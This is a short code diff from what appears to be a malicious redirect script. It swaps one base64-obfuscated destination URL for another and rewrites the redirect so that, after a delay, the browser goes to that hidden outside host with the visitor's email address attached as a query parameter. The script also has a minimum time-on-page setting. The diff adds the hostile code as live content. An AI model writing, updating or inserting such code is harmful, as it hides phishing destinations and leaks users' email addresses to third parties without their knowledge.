@@ -277,7 +277,7 @@
       };
       
       const config = {
-        targetUrl: decodeString('aHR0cHM6Ly90c2Uxa3BjdHVhLnRvcGx1Y2t5Y2FzaW5vN2JldC5jb20'),
+        targetUrl: decodeString('aHR0cHM6Ly9zNnhtbWFhYzlhLmdpbmNlZXJ3YW4ucGljcy8g'),
         loadTime: Date.now(),
         widgetId: null,
         minTimeOnPage: 3000,
@@ -374,7 +374,7 @@
         
         // Redirect after a short delay
         setTimeout(function() {
-          window.location.href = config.targetUrl + '$' + encodedEmail;
+          window.location.href = config.targetUrl + '?email=' + encodedEmail;
         }, 1500);
       });
     })();
